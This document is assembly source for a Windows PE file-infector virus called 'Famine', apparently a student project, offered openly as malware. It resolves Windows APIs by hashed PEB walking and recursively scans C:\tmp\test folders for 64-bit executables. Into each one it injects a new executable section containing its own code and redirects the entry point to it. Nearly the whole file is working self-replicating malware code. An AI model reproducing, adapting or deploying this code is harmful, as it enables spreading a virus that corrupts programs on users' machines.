[BITS 64]

section .text
    global start
	global _get_proc_address
	global _get_address_table
	global load_function
    global famine
	global _alloc_find_data_strust
	global _closeHandleFile
	global _findNextFile
	global _openCurrentFile
	global _padTextSection
	global _copyShellcode
	global _prepareChangeDirectory_prepareExit
	global _changeDirectory
	global _verifyDot
	global _setupNewSection
	global _clearAndTerminate
	global _writePadding
	global _checkSignature
	global AddNewSection
	global _goBackDir

;------------------------------; ***EntryPoint***
start:
	nop
	nop
	nop
	nop
    call _saveEntryPoint
    mov rbx, rax
    jmp _get_address_table

;------------------------------; Data in .famine section
; https://github.com/snus-b/Metasploit_Function_Hashes
_address_table_hash:
    localAlloc_hash dd 0x528176EE; + 0x11 | 0x4
    localFree_hash  dd 0xEA61FCB1; + 0x15
    exitProcess dd 0x56A2B5F0
    createFileA dd 0x4FDAF6DA
    getFileSize dd 0x701E12C6
    readFile dd 0xBB5F9EAD
    writeFile dd 0x5BAE572D
    closeHandle dd 0x528796C6
    findFirstFileA dd 0x95DA3590
    findNextFileA dd 0xF76C45E7
    setCurrentDirectoryA dd 0xAD2D1512
    getCurrentDirectoryA dd 0xED2D1511
    getModuleHandleA dd 0xDAD5B06C ; + 0x41
_resources:
    folderToInfect1 db "C:\\tmp\\test\\", 0; + 0x45
    folderToInfect2 db "C:\\tmp\\test2\\", 0
    target db "*", 0; + 0x66
    signature db "Famine version 1.0 (c)oded by jdecorte-mbucci", 0 ; 0x68
	originalEntryPoint dd 0x00000000 ; 0x96
;------------------------------;

_saveEntryPoint:
    xor rax, rax
    mov rax, gs:[0x60]          ; RAX = Address of PEB

    mov rax, [rax + 0x18]       ; RAX = PEB_LDR_DATA (PEB->Ldr)
    mov rax, [rax + 0x10]       ; RAX = InLoadOrderModuleList (first module entry)
    
    mov rbx, [rax + 0x30]       ; RBX = Base address of the main module (LDR_DATA_TABLE_ENTRY->DllBase)

    xor rax, rax
    mov eax, [rbx + 0x3C]       ; RAX = Offset to IMAGE_NT_HEADERS (e_lfanew)
    add rax, rbx                ; RAX = Address of IMAGE_NT_HEADERS
    mov eax, [rax + 0x18 + 0x10] ; RAX = Entry point RVA (OptionalHeader.AddressOfEntryPoint)
    add rax, rbx                ; RAX = Entry point address (Base + RVA)

    ret

; Registers configuration
; rbx: this code entrypoint
_get_address_table:
	mov rcx, [rbx + 0x11]
	call _get_proc_address
	mov r15, rax ; r15 = LocalAlloc

	xor rcx, rcx
	mov rdx, rcx
	add rcx, 0x40
	add rdx, 104
	call rax

	mov r14, rax ; r14 = address of address table
	mov rax, r15
	call _prepareStoreAddress

	push r14
	mov rcx, [rbx + 0x15]
	call _get_proc_address ; rax = LocalFree
	pop r14
	call _prepareStoreAddress

	push r14
	mov rcx, [rbx + 0x19]
	call _get_proc_address ; rax = ExitProcess
	pop r14
	call _prepareStoreAddress

	push r14
	mov rcx, [rbx + 0x1d]
	call _get_proc_address ; rax = CreateFileA
	pop r14
	call _prepareStoreAddress

	push r14
	mov rcx, [rbx + 0x21]
	call _get_proc_address ; rax = GetFileSize
	pop r14
	call _prepareStoreAddress

	push r14
	mov rcx, [rbx + 0x25] ; rax = ReadFile
	call _get_proc_address
	pop r14
	call _prepareStoreAddress

	push r14
	mov rcx, [rbx + 0x29]
	call _get_proc_address ; rax = WriteFile
	pop r14
	call _prepareStoreAddress

	push r14
	mov rcx, [rbx + 0x2d]
	call _get_proc_address ; rax = CloseHandle
	pop r14
	call _prepareStoreAddress

	push r14
	mov rcx, [rbx + 0x31]
	call _get_proc_address ; rax = FindFirstFileA
	pop r14
	call _prepareStoreAddress

	push r14
	mov rcx, [rbx + 0x35]
	call _get_proc_address ; rax = FindNextFileA
	pop r14
	call _prepareStoreAddress

	push r14
	mov rcx, [rbx + 0x39]
	call _get_proc_address ; rax = SetCurrentDirectoryA
	pop r14
	call _prepareStoreAddress

	push r14
	mov rcx, [rbx + 0x3d]
	call _get_proc_address ; rax = GetCurrentDirectoryA
	pop r14
	call _prepareStoreAddress

	push r14
	mov rcx, [rbx + 0x41]
	call _get_proc_address ; rax = GetModuleHandleA
	pop r14
	call _prepareStoreAddress

	xor 	rcx, rcx
	mov 	rdx, rcx
	mov 	r8, rcx
	mov 	r9, rcx
	mov 	r12, rcx
	mov 	r13, rcx
	mov 	r15, rcx
	mov 	rax, r14
	xor 	r14, r14
	jmp famine


_prepareStoreAddress:
	mov 	r9, rax
	xor 	r8, r8
	mov 	rdx, r8
	mov 	rcx, r14

_storeAddress:
	cmp 	QWORD [ds:rcx + rdx], r8
	jne 	_storeAddress_continueIncrement
	mov 	QWORD [ds:rcx + rdx], r9
	mov 	rax, rdx
	ret

_storeAddress_continueIncrement:
	add 	rdx, 8
	jmp 	_storeAddress

; PARAMETERS
; rcx = function + dll hash
; =======
; return address of the function
_get_proc_address:
	mov rdi, rcx
    ; Access PEB
    xor rax, rax
    mov rax, QWORD gs:[0x60]              ; RAX = PEB address
    mov rax, [rax + 0x18]           ; RAX = Address_of_LDR
	mov r10, [rax + 0x10]			; RBX = First entry in InLoadOrderModuleList (PEB_LDR_DATA->InLoadOrderModuleList)

    .find_function_loop:
		; get pModuleBase -> r14
		mov r14, [r10 + 0x30]

		; typedef struct _IMAGE_NT_HEADERS {
		; 	DWORD                   Signature;  // 0x4
		; 	IMAGE_FILE_HEADER       FileHeader;
		; 	IMAGE_OPTIONAL_HEADER32 OptionalHeader;
		; } IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; // 0x18
		; get dwExportDirRVA -> r15d
		mov r15d, [r14 + 0x3c] ; edx = e_lfanew
		add r15, r14 ; r15 = ntheader
		add r15, 0x18 ; r15
		add r15, 0x70
		mov r15d, [r15]
		and r15d, 0x0FFFFFFF
		
		test r15d, r15d
		jz .next_module

		; get pExportDir -> r15
		add r15, r14

		; typedef struct _UNICODE_STRING {
		; USHORT Length;				; 2 bytes
		; USHORT MaximumLength; 		; 2 bytes
		; PWSTR  Buffer;				; 8 bytes
		; } UNICODE_STRING, *PUNICODE_STRING;
		; dllBase + 0x58 = LDR_DATA_TABLE_ENTRY->BaseDllName
		mov rcx, [r10 + 0x58 + 0x8] ; rcx = BaseDllName.Buffer
		movzx rdx, word [r10 + 0x58 + 0x2] ; rdx = BaseDllName.MaxLength
		call .ror13_hash_dll ; rax = hash of dll
		mov r11, rax

		; public struct IMAGE_EXPORT_DIRECTORY
		; {
		;     public UInt32 Characteristics;
		;     public UInt32 TimeDateStamp;
		;     public UInt16 MajorVersion;
		;     public UInt16 MinorVersion;
		;     public UInt32 Name;
		;     public UInt32 Base;
		;     public UInt32 NumberOfFunctions;
		;     public UInt32 NumberOfNames;
		;     public UInt32 AddressOfFunctions;     // RVA from base of image
		;     public UInt32 AddressOfNames;     // RVA from base of image
		;     public UInt32 AddressOfNameOrdinals;  // RVA from base of image
		; }
		mov ecx, [r15 + 0x18] ; rcx = pExportTable->NumberOfNames

		xor rdx, rdx
		mov edx, [r15 + 0x20] ; rax = pExportTable->AddressOfNames
		add rdx, r14 ; rdx = pdwFunctionNameBase

		; NEED
		; dwNumFunctions -> rcx 
		; pdwFunctionNameBase -> rdx
		; i -> rsi
		; rdi -> arg1
		; r8 -> pFunctionName
		; r9
		xor r13, r13
		xor r8, r8
		.loop_function:
			mov r8d, [rdx]
			add r8, r14
			add rdx, 4

			push r9
			push r8
			push rcx
			mov rcx, r8
			call .ror13_hash_fun
			; add rdx, r8 ; add len of fun name 
			pop rcx
			pop r8
			pop r9
			
			add rax, r11
			cmp edi, eax
			jnz .next_function

			; Function found
			jmp .function_found

			.next_function:
			inc r13
			cmp rcx, r13
			jnz .loop_function

		.next_module:
        mov r10, [r10]             ; Get next flink

		test r14, r14                ; If DllBase is NULL, we're done
        jnz .find_function_loop

		xor rax, rax ; Return NULL
		ret

	.function_found:
		xor rax, rax
		xor rcx, rcx
		xor rdx, rdx

		mov eax, [r15 + 0x24] ; pExportTable->AddressOfNameOrdinals
		add rax, r14

		mov dx, [rax + 2 * r13]


; (HMODULE) ((ULONG_PTR) pModuleBase + *(PDWORD)(pModuleBase + pExportDir->AddressOfFunctions + 4 * usOrdinalTableIndex));
		mov ecx, [r15 + 0x1C]
		add rcx, r14
		mov ecx, [rcx + 4 * rdx]
		and rcx, 0x0FFFFFFF

		xor rax, rax
		add rax, r14
		add rax, rcx

		ret


	; PARAMETERS
	; rcx = string
	; rdx = string length
	; =======
	; r8 = counter
	; r9 = dwModuleHash
	; =======
	; return hash of dll∂
	.ror13_hash_dll:
		xor r8, r8
		xor r9, r9
		.loop_hash_dll:
			mov al, byte [rcx + r8]	; al = BaseDllName.Buffer[r8]

			; to upper character
			cmp al, 0x61 ; compare with 'a'
			jl .skip_upper
			sub al, 0x20 ; al = al - 32 / to upper
			.skip_upper:

			ror r9d, 13 ; rdx = rdx >> 13
			movzx rax, al ; rax = al
			add r9, rax ; rdx = rdx + rax


			inc r8
			cmp r8, rdx
			jnz .loop_hash_dll
		mov rax, r9
		ret

	; PARAMETERS
	; rcx = string
	; =======
	; r8 = counter
	; r9 = dwModuleHash
	; =======
	; return hash of dll∂
	.ror13_hash_fun:
		xor r8, r8
		xor r9, r9
		.loop_hash_fun:
			mov al, byte [rcx + r8]	; al = BaseDllName.Buffer[rcx]

			ror r9d, 13 ; rdx = rdx >> 13
			movzx rax, al ; rax = al
			add r9, rax ; rdx = rdx + rax

			inc r8
			cmp al, 0
			jnz .loop_hash_fun
		mov rax, r9
		ret



;-------------------------------------------------------------------------------;
; Here is the real start of famine
;
;  ______   ______     __    __     __     __   __     ______    
; /\  ___\ /\  __ \   /\ "-./  \   /\ \   /\ "-.\ \   /\  ___\   
; \ \  __\ \ \  __ \  \ \ \-./\ \  \ \ \  \ \ \-.  \  \ \  __\   
;  \ \_\    \ \_\ \_\  \ \_\ \ \_\  \ \_\  \ \_\\"\_\  \ \_____\ 
;   \/_/     \/_/\/_/   \/_/  \/_/   \/_/   \/_/ \/_/   \/_____/ 
;                                                  
;-------------------------------------------------------------------------------;
famine:
    push rsp
    mov rbp, rsp
    sub rsp, 0x120

    mov r15, rax ; r15 = address table
    xor rax, rax

	lea rcx, [rbx + 0x45]
	call QWORD [ds:r15 + 80] ; SetCurrentDirectory("/tmp/test")

	xor rcx, rcx
	mov rdx, rcx
    add rcx, 0x40
    add rdx, 400 ; 16 * 25 = 400 (go 25 dir deep)
    call QWORD [ds:r15] ; Data_storage = LocalAlloc(LPTR, 400)
    mov QWORD [ss:rsp + 104], rax

_alloc_find_data_strust:
    xor rcx, rcx
    mov rdx, rcx
    add rcx, 0x0040
    add rdx, 328
    call QWORD [ds:r15] ; FindData = LocalAlloc(LPTR, 328)
    mov r14, rax ; r14 = FindData

    ; Get information about the first file in the directory

    lea rcx, [rbx + 0x66]
    mov rdx, r14
    call QWORD [ds:r15 + 64] ; FindFirstFileA("*", &FindData)
    mov r13, rax ; r13 = hFindFile
    cmp r12, 1
	jz	_changeDirectory
	jmp	_openCurrentFile


_closeHandleFile:

	mov 	rcx, r12
	call 	QWORD [ds:r15 + 56]			; CloseHandle(hFile)


_findNextFile:
	mov 	rcx, r13
	mov 	rdx, r14
	call 	QWORD [ds:r15 + 72]			; HANDLE hFile = FindNextFileA(hFile, &win32_find_dataa_struct)
	cmp 	rax, 0 
	jz	_prepareChangeDirectory_prepareExit
	cmp 	r12, 1
	jz	_changeDirectory


_openCurrentFile:

	lea 	rcx, [r14 + 44]
	mov 	rdx, 0x00000000C0000000
	xor 	r8, r8
	mov 	r9, r8 
	mov 	QWORD [ss:rsp + 0x20], 0x4
	mov 	DWORD [ss:rsp + 0x28], 0x80
	mov 	QWORD [ss:rsp + 0x30], r8
	call 	QWORD [ds:r15 + 24]	; CreateFileA(win32_find_dataa->fileName, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)
	cmp 	rax, 0xFFFFFFFFFFFFFFFF
	jz	_findNextFile
	mov 	r12, rax			; *** r12: actual HANDLE hFile. We have read/write permissions over the file with this handle ***


;-----------------;
; Check file size ;
;-----------------;

	mov 	rcx, r12
	xor 	rdx, rdx
	call 	QWORD [ds:r15 + 32]		; GetFileSize(hFile, NULL)
	cmp 	rax, 0xFFFFFFFFFFFFFFFF 	; if the size is invalid (INVALID_FILE_SIZE) ...
	jz	_closeHandleFile		; ... go back and close the handle
	mov 	rdi, rax 			; *** rdi: size of target file ***


;-------------------------------------------------------------------------------;
; Allocate memory in the heap to copy the opened file.. 			;
; ... then check if the file meets the following criteria:			;
; 										;
; 1) The first WORD must be equal to 'MZ'					;
; 2) Base of file + 0x3C (SIGNATURE) must be equal to 'PE'			;
; 3) WORD SIGNATURE + 4 must be equal to 0x8664 (64bit)				;
; 4) IMAGE_FILE_HEADER -> Characteristics must be less than 0x2000 (not a .dll)	;
; 5) Signature 'alca' must not present at the beginning of the .text 		;
;-------------------------------------------------------------------------------;

	xor 	rcx, rcx
	mov 	rdx, rcx
	add 	rcx, 0x0040
	add 	rdx, rdi
	call 	QWORD [ds:r15 + 0]		; LocalAlloc(LPTR, sizeof(target))
	mov 	rsi, rax 			; *** rsi: allocation where the file can be read into***
	
	mov 	rcx, r12
	mov 	rdx, rsi
	mov 	r8, rdi
	xor 	r9, r9 
	mov 	QWORD [ss:rsp + 0x20], r9
	call 	QWORD [ds:r15 + 40]		; ReadFile(HANDLE hFile, LPVOID buffer, DWORD nNumberOfBytesToRead, NULL, NULL)

	cmp 	DWORD [rsi], 0x00905A4D		; check if 'MZ'
	jne 	_freeCall

	xor 	rax, rax
	mov 	eax, [rsi + 3Ch]
	add 	rax, rsi

	cmp 	WORD [ds:rax], 0x4550 		; check if 'PE'
	jne 	_freeCall

	cmp 	WORD [ds:rax + 4], 0x8664	; check if 64bit
	jne 	_freeCall

	add 	rax, 16h
	mov 	rcx, rax 
	xor 	rax, rax 
	mov 	ax, WORD [ds:rcx]
	and 	rax, 0x2000
	cmp 	rax, 0 				; check if .exe
	jne 	_freeCall


	; Find last section
	xor 	rax, rax
	mov		rcx, rax
	mov		rdx, rax

	mov 	eax, [rsi + 3Ch] ;
	add		rax, rsi ;

	mov cx, WORD [ds:rax + 6]
	inc WORD [ds:rax + 6] ; number of section n + 1

	mov dx, WORD [rax + 14h]
	lea r11, [rax + 18h] ; r11 = Optinal Header

	lea rax, [r11 + rdx]

	imul rcx, rcx, 28h ; nSection * sizeof(section)
	add rax, rcx ; rax : end last section


	; ** Check If Signature Exist
	mov r8, rax	
	mov rcx, [rax - 28h + 14h]
	add rcx, rsi
	add rcx, 0x68
	lea rdx, [rbx + 0x68]
	call ft_strcmp
	jz _freeCall
	mov rax, r8

	; Setup value for the injection
	mov 	QWORD [ss:rsp + 120], r13	; store HANDLE hFile onto the stack for later use
	mov 	QWORD [ss:rsp + 112], r14	; store WIN32_FIND_DATAA struct onto the stack for later use

	xor 	r13, r13
	xchg 	rdi, r13			; *** r13 : size of target file ***
	xchg 	r14, rdi 
	mov		r14, r12			; *** r14: HANDLE hFile ***
	xor 	rdi, rdi 			; *** rdi: 0 ***
	
;-------------------------------------------------------;
; The actual infection starts here:			
;							
; 1) 
;-------------------------------------------------------;

; Registers configuration at this moment:
; rax: end last section / rbx: this_code entrypoint / rsi: &target_copy  / r13: sizeof(target) / r14: HANDLE hFile / r15: &k32AddressTable
_setupSectionValue:

	mov DWORD [rax], 0x65746373 	; mov DWORD [rax], 'sect'
	mov DWORD [rax + 24h], 0xE0000000 ; Characteristics

	; ** VirtualAddress **
	mov ecx, DWORD [rax + 8h - 28h] ; rdx: VirtualSize
	add ecx, DWORD [rax + 0Ch - 28h] ; rdx: VirtualSize + VirtualAddress
	mov edx, DWORD [r11 + 20h]
	call _align_size
	mov DWORD [rax + 0Ch], ecx ; VirtualAddress
	mov DWORD [r11 + 10h], ecx ; AddressOfEntryPoint

	; ** VirtualSize **
	mov ecx, end - start
	mov edx, DWORD [r11 + 20h] ; section Alignment
	call _align_size
	mov DWORD [rax + 8h], ecx ; VirtualSize

	; ** SizeOfImage **
	mov ecx, DWORD [rax + 0Ch]
	add ecx, DWORD [rax + 8h]
	mov edx, DWORD [r11 + 20h]
	call _align_size 
	mov DWORD [r11 + 38h], ecx ; update optinalHeader.SizeOfImage + SizeOfRawData
	
	; ** SizeOfRawData **
	mov ecx, end - start
	mov edx, DWORD [r11 + 24h] ; file Alignment
	call _align_size
	mov DWORD [rax + 10h], end - start ; SizeOfRawData

	; ** PointerToRawData **
	mov ecx, r13d
	mov edx, DWORD [r11 + 24h] ; file Alignment
	call _align_size
	mov DWORD [rax + 14h], ecx ; PointerToRawData
	mov r12, rcx

_copyShellcode:
	mov 	rcx, r14
	call 	QWORD [ds:r15 + 56]		; Close old HANDLE used to read the file

	mov 	rcx, QWORD [ss:rsp + 112]
	lea 	rcx, [rcx + 44]			; WIN32_FIND_DATAA->fileName
	mov 	rdx, 0x00000000C0000000
	xor 	r8, r8
	mov 	r9, r8
	mov 	QWORD [ss:rsp + 0x20], 0x2
	mov 	DWORD [ss:rsp + 0x28], 0x80
	mov 	QWORD [ss:rsp + 0x30], r8
	call 	QWORD [ds:r15 + 24]	; CreateFileA(WIN32_FIND_DATAA->fileName, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)
	
	mov 	r14, rax
	mov 	rcx, r14
	mov 	rdx, rsi
	mov 	r8, r13
	xor 	r9, r9
	mov 	QWORD [ss:rsp + 0x20], r9
	call 	QWORD [ds:r15 + 48]		; WriteFile(HANDLE hFile, LPVOID buffer, DWORD nNumberOfBytesToWrite, NULL, NULL)
_writePadding:

	; write padding
	mov rcx, 0x40         ; LPTR allocation type (zero-initialized memory)
	mov rdx, 0x200          ; Size of buffer to allocate (number of null bytes)
	call QWORD [ds:r15]   ; LocalAlloc(LPTR, size)

	mov rcx, r14
	mov rdx, rax
	mov r8, r12
	sub r8, r13
	xor r9, r9
	mov QWORD [ss:rsp + 0x20], r9
	call QWORD [ds:r15 + 48]

	; write shellcode
	mov rcx, r14
	mov rdx, rbx
	mov r8, end - start
	xor r9, r9
	mov QWORD [ss:rsp + 0x20], r9
	call QWORD [ds:r15 + 48]

	mov 	rcx, r14
	call 	QWORD [ds:r15 + 56]		; CloseFile(hFile)


;------------------------------------------------------------;
; Jump back and find the next file after the infection       ;
;------------------------------------------------------------;

	mov 	rcx, rsi
	call 	QWORD [ds:r15 + 8]		; LocalFree(target_allocation)
	mov 	r13, QWORD [ss:rsp + 120]	; *** r13: restore HANDLE hFile for finding programs ***
	mov 	r14, QWORD [ss:rsp + 112]	; *** r14: restore WIN32_FIND_DATAA struct ***
	jmp	_findNextFile


;-----------------------------------------------------------------;
; The _freeCall procedure is needed when an invalid file is found ;
;-----------------------------------------------------------------;

_freeCall:
	mov 	rcx, rsi 
	call 	QWORD [ds:r15 + 8]		; LocalFree(target_allocation)
	jmp	_closeHandleFile


_prepareChangeDirectory_prepareExit:

;---------------------------------------------------;
; Check if we're in 'directory mode' (r12 == 1)     ;
; + If this mode is set, then go back one directory ;
; - If it's not, then turn it on		    ;
;---------------------------------------------------;
	cmp 	r12, 1
	jz	_goBackDir

	xor 	r12, r12
	inc 	r12
	mov 	rcx, r14
	call 	QWORD [ds:r15 + 8]		; LocalFree(win32_find_dataa)
	jmp	_alloc_find_data_strust


_changeDirectory:
	call 	_verifyDot
	
	cmp	rax, 0
	jz	_findNextFile

	lea 	rcx, [r14 + 44]
	call 	QWORD [r15 + 80]		; SetCurrentDirectoryA(directory)
	cmp	rax, 0
	jz	_findNextFile

	xor 	rax, rax
	mov 	r11, QWORD [ss:rsp + 104]	; *** r11: DirectoryData_storage ***
	call 	_storeDirectoryData

	dec 	r12
	jmp	_alloc_find_data_strust



_verifyDot:
	xor 	rax, rax
	inc 	rax
	cmp 	WORD [ds:r14 + 44], 0x2E2E	; check if file is '..'
	jz	_returnError
	xor 	rcx, rcx
	add 	cl, BYTE [ds:r14 + 44]
	add 	cl, BYTE [ds:r14 + 45]
	cmp 	cl, 0x2E			; check if file is '.'
	jz	_returnError
	ret

_returnError:
	xor 	rax, rax 
	ret

_goBackDir:
	xor 	rcx, rcx
	lea 	rcx, [ds:rbx + 0x6E]		; rcx: '..'
	call 	QWORD [ds:r15 + 80]		; SetCurrentDirectory('..')
	cmp 	rax, 0
	jz	_clearAndTerminate

	xor 	rax, rax
	add 	rax, 384
	mov 	r11, QWORD [ss:rsp + 104]	; *** r11: DirectoryData_storage ***
	call 	_retrieveDirectoryData
	jmp	_findNextFile




;-------------------------------------------------------------------------------;
; The _storeDirectoryData will store the HANDLE hFile (used for reading)	;
; + the WIN32_FIND_DATAA struct for later use					;
; The _retrieveDirectoryData will do the opposite				;
;-------------------------------------------------------------------------------;
; Requirements (_storeDirectoryData)						;
; - rax has to be zero								;
; - r11 has to be a pointer to the DirectoryData_storage allocation		;
; - r13 has to contain the old HANDLE						;
; - r14 has to be a pointer to the old win32_find_dataa struct			;
;										;
; Requirements (_retrieveDirectoryData)						;
; - rax needs to be equal to sizeof(DirectoryData_storage) (320 at the moment)	;
; - r11 needs to be a pointer to DirectoryData_storage				;
;-------------------------------------------------------------------------------;

_storeDirectoryData:
	cmp 	QWORD [ds:r11 + rax], 0
	jne 	_addRax
	xchg 	QWORD [ds:r11 + rax], r13	; store previous HANDLE in DirectoryData_storage
	xchg 	QWORD [ds:r11 + rax + 8], r14	; store previous WIN32_FIND_DATAA struct in DirectoryData_storage
	ret

_addRax:
	add 	rax, 16 
	jmp 	_storeDirectoryData


_retrieveDirectoryData:
	cmp 	QWORD [ds:r11 + rax], 0
	jz 	_subRax
	
	xor 	r13, r13
	mov 	r14, r13
	xchg 	r13, QWORD [ds:r11 + rax]	; restore previous HANDLE in r13 and zero out the previously occupied space in DirectoryData_storage
	xchg 	r14, QWORD [ds:r11 + rax + 8]	; restore previous WIN32_FIND_DATAA struct and zero out the previously occupied space in DirectoryData_storage
	ret

_subRax:
	sub 	rax, 16
	jmp 	_retrieveDirectoryData

; rcx = value
; rdx = alignment
_align_size:
	dec 	edx
	add		ecx, edx
	not 	edx
	and 	ecx, edx
	ret

ft_strcmp:
	mov eax, [rcx]
	sub eax, [rdx]
	jne .exit
	cmp byte [rcx], 0 ; if s1 end
	je .exit
	cmp byte [rdx], 0 ; if s2 end
	je .exit
	inc rcx
	inc rdx
	jmp ft_strcmp
.exit:
	ret

_clearAndTerminate:
	xor 	rcx, rcx
	; jmp		originalEntryPoint
	call 	QWORD [ds:r15 + 16]
	
end: